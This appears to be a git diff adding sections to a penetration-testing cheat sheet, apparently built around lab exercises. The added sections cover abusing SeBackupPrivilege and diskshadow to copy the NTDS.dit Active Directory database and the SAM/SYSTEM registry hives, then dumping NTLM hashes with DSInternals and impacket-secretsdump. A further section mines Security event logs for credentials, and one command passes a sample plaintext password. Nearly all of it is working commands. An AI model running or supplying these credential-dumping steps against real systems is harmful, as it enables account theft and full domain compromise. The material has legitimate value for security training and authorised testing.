@@ -140,6 +140,7 @@ crackmapexec smb <ip> -u '' -p ''  # if using CCE
 ## Finding file
 ```bash
 dir <file> /s # recommended from C:\
+dir <directory> # C:\NameOfDirectory check what files exists 
 ```
 
 ## Network
@@ -213,9 +214,54 @@ loglog
 sekurlsa::minidump <file.dmp> # lsass.dmp
 sekurlsa::logonpasswords # dumped creds
 ```
+## Windows Build-in Groups
+```bash
+Import-Module .\SeBackupPrivilegeUtils.dll # import module 
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Get-SeBackupPrivilege # see if privilege enabled
+Set-SeBackupPrivilege # change status enabled/disabled
+Copy-FileSeBackupPrivilege 'C:\<dir>\<file>' .\<file> # copy privileged file which could not be
+# ^ opened with current permisions
+# Active directory database NTDS.dit which contains NTLM hashes if
+# if database in locked or not accessible use diskshadow >>>
+Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit # bypass ACL and opy the NTDS.dit locally
+reg save HKLM\SYSTEM SYSTEM.SAV
+reg save HKLM\SAM SAM.SAV # can be dumped hashes by using impacket secretsdump.py
+Import-Module .\DSInternals.psd1 # module also used to dump creds (PowerShell)
+$key = Get-BootKey -SystemHivePath .\SYSTEM
+Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+impacket-secretsdump -sam sam -system system local # with having databases in local machine
+# ^ dump hashes
+impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL # the same
 
-
-
+```
+## Diskshadow && robocopy
+```bash
+diskshadow.exe # could be diskshadow RUN <<<
+diskshadow -s script.txt # run script with diskshadow commands
+# reference to microsoft documentation with all commands
+https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow
+# default script
+set verbose on
+set metadata C:\Windows\Temp\meta.cab
+set context clientaccessible
+set context persistent
+begin backup
+add volume C: alias cdrive
+create
+expose %cdrive% E:
+end backup
+# robocopy
+robocopy /B E:\Windows\NTDS .\ntds ntds.dit
+```
+## Event Log Readers
+```bash
+net localgroup "Event Log Readers"
+wevtutil qe Security /rd:true /f:text | Select-String "/user" # security logs by tool wevtutil
+wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user" # pass creds to wevtutil
+Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+# ^ filter process events by -eq 4688
+```
 
 
 
